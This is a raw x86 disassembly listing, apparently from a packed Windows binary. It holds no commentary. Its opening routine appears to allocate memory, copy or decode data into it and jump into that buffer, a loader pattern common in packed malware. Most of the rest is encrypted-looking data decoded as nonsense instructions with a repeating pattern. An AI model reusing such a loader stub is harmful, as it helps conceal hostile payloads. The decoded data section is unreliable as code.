  4152f5:	call   DWORD PTR ds:0x417018
  4152fb:	mov    DWORD PTR [ebp-0x60],eax
  4152fe:	mov    DWORD PTR [ebp-0x54],0x3a
  415305:	mov    BYTE PTR [ebp-0x34],0x0
  415309:	mov    DWORD PTR [ebp-0x8],0xa46de55
  415310:	mov    DWORD PTR [ebp-0x68],0x122d67
  415317:	jmp    0x41532e
  415319:	mov    BYTE PTR ds:0x417038,0x0
  415320:	push   0x42cfc8
  415325:	call   DWORD PTR ds:0x417018
  41532b:	mov    DWORD PTR [ebp-0x2c],eax
  41532e:	push   0x0
  415330:	call   DWORD PTR ds:0x417018
  415336:	mov    DWORD PTR [ebp-0x2c],eax
  415339:	push   DWORD PTR ds:0x417018
  41533f:	pop    edx
  415340:	mov    DWORD PTR [ebp-0x6c],edx
  415343:	lea    edx,[ebp-0x40]
  415346:	push   edx
  415347:	mov    eax,DWORD PTR [ebp-0x60]
  41534a:	push   eax
  41534b:	call   DWORD PTR ds:0x417024
  415351:	mov    DWORD PTR [ebp-0x44],eax
  415354:	push   DWORD PTR [ebp-0x30]
  415357:	push   0x1000
  41535c:	mov    eax,DWORD PTR [ebp-0x14]
  41535f:	add    eax,0x23
  415362:	add    eax,0x23
  415365:	push   eax
  415366:	xor    eax,eax
  415368:	push   eax
  415369:	mov    ecx,DWORD PTR [ebp-0x44]
  41536c:	call   ecx
  41536e:	push   eax
  41536f:	pop    ecx
  415370:	mov    DWORD PTR [ebp-0x4],ecx
  415373:	mov    ecx,DWORD PTR [ebp-0x68]
  415376:	sub    ecx,0xdae0b
  41537c:	mov    DWORD PTR [ebp-0x68],ecx
  41537f:	cmp    DWORD PTR [ebp-0x4],0x0
  415383:	jne    0x41539d
  415385:	push   0x0
  415387:	push   0x0
  415389:	call   0x416a5c
  41538e:	push   0x0
  415390:	call   DWORD PTR ds:0x41702c
  415396:	mov    BYTE PTR ds:0x447f40,0x0
  41539d:	mov    edx,DWORD PTR [ebp-0x4]
  4153a0:	add    edx,DWORD PTR [ebp-0x14]
  4153a3:	mov    eax,DWORD PTR [ebp-0x8]
  4153a6:	mov    DWORD PTR [edx],eax
  4153a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4153ab:	add    ecx,DWORD PTR [ebp-0x54]
  4153ae:	mov    DWORD PTR [ebp-0x5c],ecx
  4153b1:	mov    edx,DWORD PTR ds:0x417024
  4153b7:	mov    DWORD PTR [ebp-0x4c],edx
  4153ba:	mov    eax,DWORD PTR [ebp-0x4]
  4153bd:	add    eax,DWORD PTR [ebp-0x14]
  4153c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4153c3:	mov    DWORD PTR [eax+0x4],ecx
  4153c6:	mov    edx,DWORD PTR [ebp-0x4]
  4153c9:	add    edx,DWORD PTR [ebp-0x14]
  4153cc:	mov    DWORD PTR [ebp-0xc],edx
  4153cf:	cmp    DWORD PTR [ebp-0x68],0x0
  4153d3:	jbe    0x4153f0
  4153d5:	mov    eax,DWORD PTR [ebp-0xc]
  4153d8:	push   eax
  4153d9:	mov    ecx,DWORD PTR [ebp-0x14]
  4153dc:	push   ecx
  4153dd:	mov    edx,DWORD PTR [ebp-0x2c]
  4153e0:	add    edx,DWORD PTR [ebp-0x68]
  4153e3:	push   edx
  4153e4:	mov    eax,DWORD PTR [ebp-0x4]
  4153e7:	push   eax
  4153e8:	call   0x41696e
  4153ed:	add    esp,0x10
  4153f0:	cmp    DWORD PTR [ebp-0x5c],0x0
  4153f4:	je     0x415404
  4153f6:	push   DWORD PTR [ebp-0x4c]
  4153f9:	push   DWORD PTR [ebp-0x6c]
  4153fc:	mov    ecx,DWORD PTR [ebp-0x5c]
  4153ff:	push   ecx
  415400:	jmp    ecx
  415402:	jmp    0x41540a
  415404:	mov    ecx,DWORD PTR [ebp+0x8]
  415407:	mov    DWORD PTR [ebp-0x18],ecx
  41540a:	mov    eax,0x1
  41540f:	mov    esp,ebp
  415411:	pop    ebp
  415412:	ret    
  415413:	push   ebp
  415414:	mov    ebp,esp
  415416:	pop    ebp
  415417:	ret    
  415418:	push   ebp
  415419:	mov    ebp,esp
  41541b:	sub    esp,0x54
  41541e:	mov    DWORD PTR [ebp-0x34],0x0
  415425:	mov    DWORD PTR [ebp-0x4],0x0
  41542c:	mov    DWORD PTR [ebp-0x50],0x0
  415433:	mov    DWORD PTR [ebp-0x4c],0x0
  41543a:	mov    DWORD PTR [ebp-0x30],0x0
  415441:	lea    eax,[ebp-0x38]
  415444:	push   eax
  415445:	push   0x8
  415447:	call   DWORD PTR ds:0x417020
  41544d:	call   DWORD PTR ds:0x417014
  415453:	mov    DWORD PTR [ebp-0x30],eax
  415456:	lea    ecx,[ebp-0x48]
  415459:	push   ecx
  41545a:	call   DWORD PTR ds:0x417010
  415460:	mov    edx,DWORD PTR [ebp-0x34]
  415463:	push   edx
  415464:	call   0x415493
  415469:	add    esp,0x4
  41546c:	call   0x41695f
  415471:	mov    DWORD PTR [ebp-0x54],0x0
  415478:	jmp    0x415483
  41547a:	mov    eax,DWORD PTR [ebp-0x54]
  41547d:	add    eax,0x1
  415480:	mov    DWORD PTR [ebp-0x54],eax
  415483:	cmp    DWORD PTR [ebp-0x54],0x64
  415487:	jae    0x41548b
  415489:	jmp    0x41547a
  41548b:	xor    eax,eax
  41548d:	mov    esp,ebp
  41548f:	pop    ebp
  415490:	ret    0x10
  415493:	push   ebp
  415494:	mov    ebp,esp
  415496:	sub    esp,0x3c
  415499:	push   esi
  41549a:	mov    DWORD PTR [ebp-0x3c],0x0
  4154a1:	mov    DWORD PTR [ebp-0x38],0x0
  4154a8:	mov    DWORD PTR [ebp-0x30],0x0
  4154af:	mov    DWORD PTR [ebp-0x24],0x0
  4154b6:	mov    DWORD PTR [ebp-0x1c],0x0
  4154bd:	mov    DWORD PTR [ebp-0x28],0x0
  4154c4:	mov    DWORD PTR [ebp-0x2c],0x448fc8
  4154cb:	mov    DWORD PTR [ebp-0x24],0xb3d96a4f
  4154d2:	mov    DWORD PTR [ebp-0x34],0x0
  4154d9:	mov    eax,DWORD PTR [ebp-0x24]
  4154dc:	mov    DWORD PTR [ebp-0x20],eax
  4154df:	mov    DWORD PTR [ebp-0x4],0x0
  4154e6:	mov    ecx,DWORD PTR ds:0x417014
  4154ec:	mov    DWORD PTR [ebp-0x4],ecx
  4154ef:	push   0x0
  4154f1:	push   0x4e
  4154f3:	push   0x1e
  4154f5:	push   0x0
  4154f7:	push   0xffffffff
  4154f9:	call   DWORD PTR ds:0x41701c
  4154ff:	test   eax,eax
  415501:	je     0x41693e
  415507:	dec    edi
  415508:	inc    edx
  415509:	out    dx,al
  41550a:	jmp    0x75a6:0xa42b44a9
  415511:	(bad)  
  415512:	mov    ch,0xee
  415514:	std    
  415515:	sbb    BYTE PTR [esi+0x52],bh
  415518:	stos   BYTE PTR es:[edi],al
  415519:	inc    esp
  41551a:	sub    esp,DWORD PTR [edx+eiz*4+0x11f5d675]
  415521:	add    bl,BYTE PTR [eax]
  415523:	jle    0x41550f
  415525:	stos   BYTE PTR es:[edi],al
  415526:	inc    esp
  415527:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  41552e:	add    bl,BYTE PTR [eax]
  415530:	jle    0x41551c
  415532:	stos   BYTE PTR es:[edi],al
  415533:	inc    esp
  415534:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  41553b:	add    bl,BYTE PTR [eax]
  41553d:	jle    0x415529
  41553f:	stos   BYTE PTR es:[edi],al
  415540:	inc    esp
  415541:	sub    esp,DWORD PTR [edx+ebp*4+0x1fb5d674]
  415548:	sbb    eax,0x1eea70a2
  41554d:	dec    ebp
  41554e:	out    0x85,al
  415550:	sbb    dh,BYTE PTR [edx+ebx*4+0x78]
  415554:	xor    BYTE PTR [esi+0x70],dl
  415557:	pop    ss
  415558:	cdq    
  415559:	mov    dh,BYTE PTR [ecx+ebx*2]
  41555c:	retf   
  41555d:	lds    eax,FWORD PTR [edi]
  41555f:	mov    bh,0xd8
  415561:	xor    DWORD PTR [ecx+0x79],esp
  415564:	adc    BYTE PTR [ebp+eax*8-0x3839f4d0],al
  41556b:	push   ebp
  41556c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41556d:	sar    BYTE PTR [edi+0x22],0x71
  415571:	adc    dl,cl
  415573:	out    dx,al
  415574:	or     edi,DWORD PTR [eax-0x7c]
  415577:	iret   
  415578:	sbb    dh,BYTE PTR [edx+0x150f3fd0]
  41557e:	je     0x41554e
  415580:	stos   BYTE PTR es:[edi],al
  415581:	inc    esp
  415582:	sub    esp,DWORD PTR [edx+eiz*4-0x2130298b]
  415589:	adc    al,0x96
  41558b:	inc    eax
  41558c:	inc    esp
  41558d:	rcr    BYTE PTR [ecx-0x5725f5eb],cl
  415593:	call   0x3e20beb3
  415598:	dec    ebp
  415599:	or     al,0x77
  41559b:	test   sp,bx
  41559e:	jg     0x4155f0
  4155a0:	in     eax,0x67
  4155a2:	int3   
  4155a3:	mov    ebp,0x8f3706b6
  4155a8:	ja     0x4155a2
  4155aa:	jns    0x415563
  4155ac:	fld    TBYTE PTR [esi-0x3425bf98]
  4155b2:	mov    ds:0xf63c04d1,eax
  4155b7:	xchg   ebx,eax
  4155b8:	je     0x415548
  4155ba:	or     eax,DWORD PTR [edx+0x49c57abf]
  4155c0:	cmp    al,0x41
  4155c2:	cdq    
  4155c3:	push   cs
  4155c4:	or     bl,dl
  4155c6:	test   al,0xe8
  4155c8:	sbb    ebp,DWORD PTR [eax-0x21]
  4155cb:	push   ecx
  4155cc:	rcl    DWORD PTR [edx-0x315a7989],1
  4155d2:	jg     0x415619
  4155d4:	js     0x4155a3
  4155d6:	int3   
  4155d7:	daa    
  4155d8:	sub    ebp,DWORD PTR [ecx+0x53ead337]
  4155de:	jns    0x415567
  4155e0:	inc    esi
  4155e1:	xor    al,0x68
  4155e3:	lods   al,BYTE PTR cs:[esi]
  4155e5:	pusha  
  4155e6:	mov    ds:0xf6a199cf,eax
  4155eb:	fwait
  4155ec:	or     al,0xd
  4155ee:	or     esp,edi
  4155f0:	js     0x415653
  4155f2:	jo     0x415634
  4155f4:	inc    esp
  4155f5:	rcr    BYTE PTR [ecx+0x75a2a42b],cl
  4155fb:	(bad)  
  4155fc:	mov    ch,0x11
  4155fe:	add    bl,BYTE PTR [eax]
  415600:	jle    0x4155ec
  415602:	stos   BYTE PTR es:[edi],al
  415603:	inc    esp
  415604:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  41560b:	add    bl,BYTE PTR [eax]
  41560d:	jle    0x4155f9
  41560f:	cli    
  415610:	add    DWORD PTR [ebx],ebp
  415612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415613:	out    dx,al
  415614:	je     0x4155eb
  415616:	mov    ch,0x77
  415618:	dec    esp
  415619:	push   ebp
  41561a:	xor    edx,ebp
  41561c:	stos   BYTE PTR es:[edi],al
  41561d:	inc    esp
  41561e:	sub    esp,DWORD PTR [edx+eiz*4+0x1155d675]
  415625:	add    BYTE PTR [ecx],bl
  415627:	jne    0x415614
  415629:	mov    al,ds:0xa6462b44
  41562e:	jne    0x415606
  415630:	xor    DWORD PTR [edi],edx
  415632:	add    bl,BYTE PTR [eax]
  415634:	jle    0x415620
  415636:	stos   BYTE PTR es:[edi],al
  415637:	pop    es
  415638:	xchg   esi,eax
  415639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41563a:	mov    ds:0x11b5c675,al
  41563f:	add    bl,BYTE PTR [eax]
  415641:	jnp    0x41562d
  415643:	stos   BYTE PTR es:[edi],al
  415644:	inc    esp
  415645:	imul   esp,DWORD PTR [edx+eiz*4+0x11b5d665],0x0
  41564d:	sbb    BYTE PTR [esi-0x11],bh
  415650:	stos   BYTE PTR es:[edi],al
  415651:	inc    ebp
  415652:	sub    esp,DWORD PTR [edx+eiz*4+0x11b0d675]
  415659:	add    ebx,DWORD PTR [eax]
  41565b:	jle    0x415647
  41565d:	stos   BYTE PTR es:[edi],al
  41565e:	inc    esp
  41565f:	sub    edx,DWORD PTR [esi+ebp*4+0x11b1d675]
  415666:	add    dl,BYTE PTR [edx]
  415668:	sub    dh,0xaa
  41566b:	inc    esi
  41566c:	sub    esp,esp
  41566e:	and    esi,DWORD PTR [ebp-0x2a]
  415671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415672:	adc    DWORD PTR [edx],eax
  415674:	or     BYTE PTR [esi-0x16],bh
  415677:	stos   BYTE PTR es:[edi],al
  415678:	inc    esp
  415679:	cmp    esp,DWORD PTR [edx+eiz*4+0x11b5d665]
  415680:	add    bl,BYTE PTR [eax]
  415682:	jle    0x41567e
  415684:	stos   BYTE PTR es:[edi],al
  415685:	inc    esp
  415686:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  41568d:	add    bl,BYTE PTR [eax]
  41568f:	jp     0x41567b
  415691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415692:	inc    esp
  415693:	jb     0x41563c
  415695:	mov    ds:0x1a75d675,al
  41569a:	add    cl,BYTE PTR [ebp+0x41]
  41569d:	jmp    0x75a2:0xa42b44aa
  4156a4:	(bad)  
  4156a5:	mov    ch,0x11
  4156a7:	add    bl,BYTE PTR [eax]
  4156a9:	jle    0x415695
  4156ab:	stos   BYTE PTR es:[edi],al
  4156ac:	inc    esp
  4156ad:	sub    esp,DWORD PTR [edx+eiz*4+0x9b5da55]
  4156b4:	add    bl,BYTE PTR [eax]
  4156b6:	jle    0x4156a2
  4156b8:	stos   BYTE PTR es:[edi],al
  4156b9:	inc    esp
  4156ba:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4156c1:	add    bl,BYTE PTR [eax]
  4156c3:	jle    0x4156af
  4156c5:	stos   BYTE PTR es:[edi],al
  4156c6:	inc    esp
  4156c7:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4156ce:	add    bl,BYTE PTR [eax]
  4156d0:	jle    0x4156bc
  4156d2:	stos   BYTE PTR es:[edi],al
  4156d3:	inc    esp
  4156d4:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4156db:	add    bl,BYTE PTR [eax]
  4156dd:	jle    0x4156c9
  4156df:	stos   BYTE PTR es:[edi],al
  4156e0:	inc    esp
  4156e1:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4156e8:	add    bl,BYTE PTR [eax]
  4156ea:	jle    0x4156d6
  4156ec:	stos   BYTE PTR es:[edi],al
  4156ed:	inc    esp
  4156ee:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4156f5:	add    bl,BYTE PTR [eax]
  4156f7:	jle    0x4156e3
  4156f9:	stos   BYTE PTR es:[edi],al
  4156fa:	inc    esp
  4156fb:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  415702:	add    bl,BYTE PTR [eax]
  415704:	jle    0x4156f0
  415706:	stos   BYTE PTR es:[edi],al
  415707:	push   0x5f
  415709:	rcr    edx,0x1
  41570c:	(bad)  
  41570d:	mov    ch,0x11
  41570f:	add    ch,BYTE PTR [eax+0x54aaea75]
  415715:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d213]
  41571c:	push   es
  41571d:	sbb    BYTE PTR [esi-0x46],bh
  415720:	out    dx,eax
  415721:	pop    es
  415722:	sbb    eax,esi
  415724:	in     eax,dx
  415725:	jne    0x4156fd
  415727:	mov    ch,0x11
  415729:	add    bl,BYTE PTR [eax]
  41572b:	pop    esi
  41572c:	jmp    0x7d1:0xd605a4aa
  415733:	mov    ch,0xb5
  415735:	adc    DWORD PTR [edx],eax
  415737:	sbb    BYTE PTR [esi],bl
  415739:	jmp    0x75a2:0xafeb44aa
  415740:	test   BYTE PTR [ebp+0x7a720211],dh
  415746:	jmp    0x75a2:0xa42b44aa
  41574d:	(bad)  
  41574e:	mov    ch,0x11
  415750:	add    bl,BYTE PTR [eax]
  415752:	jle    0x41571e
  415754:	stos   BYTE PTR es:[edi],al
  415755:	inc    esp
  415756:	retf   
  415757:	mov    dl,al
  415759:	adc    BYTE PTR [edx+0x180272da],bh
  41575f:	jle    0x415749
  415761:	stos   BYTE PTR es:[edi],al
  415762:	inc    esp
  415763:	sub    eax,DWORD PTR [esi+ebp*4+0x11b7d675]
  41576a:	add    bl,BYTE PTR [eax]
  41576c:	ret    0xaaee
  41576f:	inc    esp
  415770:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  415777:	add    bl,BYTE PTR [eax]
  415779:	jle    0x415765
  41577b:	jmp    0xd675:0xa2642b44
  415782:	mov    ch,0x11
  415784:	add    bl,BYTE PTR [eax]
  415786:	jle    0x415772
  415788:	stos   BYTE PTR es:[edi],al
  415789:	inc    esp
  41578a:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  415791:	add    bl,BYTE PTR [eax]
  415793:	jle    0x41577f
  415795:	stos   BYTE PTR es:[edi],al
  415796:	inc    esp
  415797:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  41579e:	add    bl,BYTE PTR [eax]
  4157a0:	jle    0x41578c
  4157a2:	stos   BYTE PTR es:[edi],al
  4157a3:	inc    esp
  4157a4:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4157ab:	add    bl,BYTE PTR [eax]
  4157ad:	jle    0x415799
  4157af:	stos   BYTE PTR es:[edi],al
  4157b0:	inc    esp
  4157b1:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4157b8:	add    bl,BYTE PTR [eax]
  4157ba:	jle    0x4157a6
  4157bc:	stos   BYTE PTR es:[edi],al
  4157bd:	inc    esp
  4157be:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4157c5:	add    bl,BYTE PTR [eax]
  4157c7:	jle    0x4157b3
  4157c9:	stos   BYTE PTR es:[edi],al
  4157ca:	inc    esp
  4157cb:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4157d2:	add    bl,BYTE PTR [eax]
  4157d4:	jle    0x4157c0
  4157d6:	stos   BYTE PTR es:[edi],al
  4157d7:	inc    esp
  4157d8:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4157df:	add    bl,BYTE PTR [eax]
  4157e1:	jle    0x4157cd
  4157e3:	stos   BYTE PTR es:[edi],al
  4157e4:	inc    esp
  4157e5:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4157ec:	add    bl,BYTE PTR [eax]
  4157ee:	jle    0x4157da
  4157f0:	stos   BYTE PTR es:[edi],al
  4157f1:	inc    esp
  4157f2:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4157f9:	add    bl,BYTE PTR [eax]
  4157fb:	jle    0x4157e7
  4157fd:	stos   BYTE PTR es:[edi],al
  4157fe:	inc    esp
  4157ff:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  415806:	add    bl,BYTE PTR [eax]
  415808:	jle    0x4157f4
  41580a:	stos   BYTE PTR es:[edi],al
  41580b:	inc    esp
  41580c:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  415813:	add    bl,BYTE PTR [eax]
  415815:	jle    0x415801
  415817:	stos   BYTE PTR es:[edi],al
  415818:	inc    esp
  415819:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  415820:	add    bl,BYTE PTR [eax]
  415822:	jle    0x41580e
  415824:	stos   BYTE PTR es:[edi],al
  415825:	inc    esp
  415826:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  41582d:	add    bl,BYTE PTR [eax]
  41582f:	jle    0x41581b
  415831:	stos   BYTE PTR es:[edi],al
  415832:	inc    esp
  415833:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  41583a:	add    bl,BYTE PTR [eax]
  41583c:	jle    0x415828
  41583e:	stos   BYTE PTR es:[edi],al
  41583f:	inc    esp
  415840:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  415847:	add    bl,BYTE PTR [eax]
  415849:	jle    0x415835
  41584b:	stos   BYTE PTR es:[edi],al
  41584c:	inc    esp
  41584d:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  415854:	add    bl,BYTE PTR [eax]
  415856:	jle    0x415842
  415858:	stos   BYTE PTR es:[edi],al
  415859:	inc    esp
  41585a:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  415861:	add    bl,BYTE PTR [eax]
  415863:	jle    0x41584f
  415865:	stos   BYTE PTR es:[edi],al
  415866:	inc    esp
  415867:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  41586e:	add    bl,BYTE PTR [eax]
  415870:	jle    0x41585c
  415872:	stos   BYTE PTR es:[edi],al
  415873:	inc    esp
  415874:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  41587b:	add    bl,BYTE PTR [eax]
  41587d:	jle    0x415869
  41587f:	stos   BYTE PTR es:[edi],al
  415880:	inc    esp
  415881:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  415888:	add    bl,BYTE PTR [eax]
  41588a:	jle    0x415876
  41588c:	stos   BYTE PTR es:[edi],al
  41588d:	inc    esp
  41588e:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  415895:	add    bl,BYTE PTR [eax]
  415897:	jle    0x415883
  415899:	stos   BYTE PTR es:[edi],al
  41589a:	inc    esp
  41589b:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4158a2:	add    bl,BYTE PTR [eax]
  4158a4:	jle    0x415890
  4158a6:	stos   BYTE PTR es:[edi],al
  4158a7:	inc    esp
  4158a8:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4158af:	add    bl,BYTE PTR [eax]
  4158b1:	jle    0x41589d
  4158b3:	stos   BYTE PTR es:[edi],al
  4158b4:	inc    esp
  4158b5:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4158bc:	add    bl,BYTE PTR [eax]
  4158be:	jle    0x4158aa
  4158c0:	stos   BYTE PTR es:[edi],al
  4158c1:	inc    esp
  4158c2:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4158c9:	add    bl,BYTE PTR [eax]
  4158cb:	jle    0x4158b7
  4158cd:	stos   BYTE PTR es:[edi],al
  4158ce:	inc    esp
  4158cf:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4158d6:	add    bl,BYTE PTR [eax]
  4158d8:	jle    0x4158c4
  4158da:	stos   BYTE PTR es:[edi],al
  4158db:	inc    esp
  4158dc:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4158e3:	add    bl,BYTE PTR [eax]
  4158e5:	jle    0x4158d1
  4158e7:	stos   BYTE PTR es:[edi],al
  4158e8:	inc    esp
  4158e9:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4158f0:	add    bl,BYTE PTR [eax]
  4158f2:	jle    0x4158de
  4158f4:	stos   BYTE PTR es:[edi],al
  4158f5:	inc    esp
  4158f6:	sub    esp,DWORD PTR [edx+eiz*4+0x11b5d675]
  4158fd:	add    bl,BYTE PTR [eax]
  4158ff:	jle    0x4158eb
  415901:	stos   BYTE PTR es:[edi],al
  415902:	inc    esp
  415903:	sub    esp,DWORD PTR [edx+eiz*4+0x1afb7d75]
  41590a:	add    dh,BYTE PTR [edi]
  41590c:	jle    0x4158f8
  41590e:	mov    edx,0x8e2b44
  415913:	scas   eax,DWORD PTR es:[edi]
  415914:	mov    ds:0xa315e08,al
  415919:	push   ebp
  41591a:	rcl    DWORD PTR [edi-0x5bc96155],1
  415920:	cmp    al,0x8f
  415922:	inc    esp
  415923:	int    0xb1
  415925:	or     edi,DWORD PTR [ecx]
  415927:	rol    DWORD PTR [ebx-0x64],1
  41592a:	mov    al,ds:0x2cb7d3e6
  41592f:	cli    
  415930:	xchg   BYTE PTR [edi+eax*8-0x56],bl
  415934:	stos   BYTE PTR es:[edi],al
  415935:	leave  
  415936:	sub    eax,ecx
  415938:	pop    ds
  415939:	jae    0x41598b
  41593b:	xchg   ebp,eax
  41593c:	mov    esp,0x830f8299
  415941:	retf   0x7c93
  415944:	push   0xe32eea6
  415949:	sub    esi,eax
  41594b:	dec    ebp
  41594c:	es int 0x1c
  41594f:	pop    esi
  415950:	pop    ebp
  415951:	cmp    al,0xea
  415953:	push   ebx
  415954:	daa    
  415955:	mov    ecx,0x8712f629
  41595a:	mov    es,WORD PTR [eax-0x70]
  41595d:	jmp    0xdfa04910
  415962:	cmp    DWORD PTR [ebx+0x30],edx
  415965:	xchg   ebp,eax
  415966:	les    ebx,FWORD PTR [edi+0x1e168d71]
  41596c:	mov    al,ds:0xd1f080e2
  415971:	lods   al,BYTE PTR ds:[esi]
  415972:	in     eax,dx
  415973:	gs inc esi
  415975:	mov    edi,0xf557b01d
  41597a:	mov    edx,0xb3d0c36d
  41597f:	mov    BYTE PTR [ebx*2+0x49df4e78],bh
  415986:	fistp  QWORD PTR [ebx+0x44914196]
  41598c:	xchg   edx,eax
  41598d:	mov    bl,0x8c
  41598f:	ja     0x415969
  415991:	and    cl,BYTE PTR ds:0x43f13cf2
  415997:	repnz cwde 
  415999:	sti    
  41599a:	sub    al,0x41
  41599c:	retf   0x3230
  41599f:	pop    es
  4159a0:	mov    bh,0x51
  4159a2:	mov    ds:0x440b9be3,al
  4159a7:	cmp    al,BYTE PTR [ebp-0x1b729f4e]
  4159ad:	push   edi
  4159ae:	or     BYTE PTR [ebx+0x5e25603a],bh
  4159b4:	ins    BYTE PTR es:[edi],dx
  4159b5:	mov    edi,0x8097f7
  4159ba:	or     eax,0x383ec1ca
  4159bf:	cdq    
  4159c0:	(bad)  
  4159c1:	iret   
  4159c2:	pop    ebp
  4159c3:	xchg   BYTE PTR [edx+0x1fd83e3],bl
  4159c9:	xchg   edx,eax
  4159ca:	inc    ebp
  4159cb:	pop    eax
  4159cc:	mov    eax,ds:0xc1f50b5d
  4159d1:	ja     0x4159bf
  4159d3:	repnz shr DWORD PTR [ebx+0x25],cl
  4159d7:	ins    BYTE PTR es:[edi],dx
  4159d8:	and    al,0x10
  4159da:	retf   0xde7b
  4159dd:	outs   dx,BYTE PTR ds:[esi]
  4159de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159df:	das    
  4159e0:	fldenv [ecx+0x2f221a80]
  4159e6:	cli    
  4159e7:	xor    eax,0x43aba77b
  4159ec:	int3   
  4159ed:	ret    
  4159ee:	push   0x3b566a0e
  4159f3:	mov    esp,esp
  4159f5:	xor    al,bh
  4159f7:	ss xchg edi,eax
  4159f9:	add    bl,BYTE PTR [edx+0x6a]
  4159fc:	sbb    dl,dl
  4159fe:	mov    ebp,0x35e4db19
  415a03:	mov    eax,ds:0xef617eda
  415a08:	or     BYTE PTR [edi+ebp*8+0x28],cl
  415a0c:	pop    edx
  415a0d:	and    al,0xad
  415a0f:	or     edi,DWORD PTR [edi+0x0]
  415a12:	test   al,0x84
  415a14:	mov    ds,WORD PTR [edx]
  415a16:	pusha  
  415a17:	nop
  415a18:	jbe    0x4159cf
  415a1a:	fld    TBYTE PTR [eax]
  415a1c:	aam    0x6d
  415a1e:	aam    0xdd
  415a20:	or     eax,0x42ef0ff1
  415a25:	mov    ebx,0xc6d1af0a
  415a2a:	jmp    0x415a6b
  415a2c:	retf   0xd245
  415a2f:	sub    eax,0xdc66b563
  415a34:	mov    ah,0x4e
  415a36:	jl     0x4159dc
  415a38:	lods   eax,DWORD PTR ds:[esi]
  415a39:	ja     0x415a87
  415a3b:	jge    0x415a8f
  415a3d:	shl    BYTE PTR [ebx-0x5b],0x69
  415a41:	add    DWORD PTR [esi-0x5],0x10461b8c
  415a48:	pop    ebp
  415a49:	imul   ebx,DWORD PTR [esi],0x1c206c4
  415a4f:	adc    al,0x95
  415a51:	lods   eax,DWORD PTR ds:[esi]
  415a52:	push   edx
  415a53:	dec    edx
  415a54:	jo     0x415a0c
  415a56:	out    dx,eax
  415a57:	out    0xb7,al
  415a59:	cmp    eax,0xfa77661b
  415a5e:	popf   
  415a5f:	mov    dl,0x6c
  415a61:	call   0xc0e8:0xfb2f8b73
  415a68:	mov    esp,0xbee480da
  415a6d:	out    dx,al
  415a6e:	mov    ds:0xfb2dd0c7,al
  415a73:	icebp  
  415a74:	fstp   QWORD PTR [eax-0x67]
  415a77:	enter  0xa5f5,0x52
  415a7b:	repnz push ebx
  415a7d:	cdq    
  415a7e:	popf   
  415a7f:	das    
  415a80:	push   es
  415a81:	adc    eax,0x2cf6ea76
  415a86:	xchg   edi,eax
  415a87:	lods   al,BYTE PTR ds:[esi]
  415a88:	stos   BYTE PTR es:[edi],al
  415a89:	jp     0x415a5b
  415a8b:	inc    eax
  415a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a8d:	dec    ebp
  415a8e:	push   0x8cf59f05
  415a93:	inc    esp
  415a94:	in     eax,0xb9
  415a96:	pop    ebp
  415a97:	imul   edx,DWORD PTR [ecx+0x25],0xc9f56ce6
  415a9e:	aaa    
  415a9f:	xchg   edx,eax
  415aa0:	jae    0x415af7
  415aa2:	mov    ds:0x761a7050,al
  415aa7:	xchg   esp,eax
  415aa8:	jg     0x415b19
  415aaa:	rcl    DWORD PTR [ecx-0x43],cl
  415aad:	outs   dx,BYTE PTR ds:[esi]
  415aae:	ins    DWORD PTR es:[edi],dx
  415aaf:	(bad)  
  415ab0:	out    0x23,al
  415ab2:	es ins BYTE PTR es:[edi],dx
  415ab4:	mov    dl,cl
  415ab6:	mov    ebx,0x58d6e966
  415abb:	imul   edi,DWORD PTR [edx],0xf7485aa8
  415ac1:	mov    ecx,DWORD PTR [ebx-0x49]
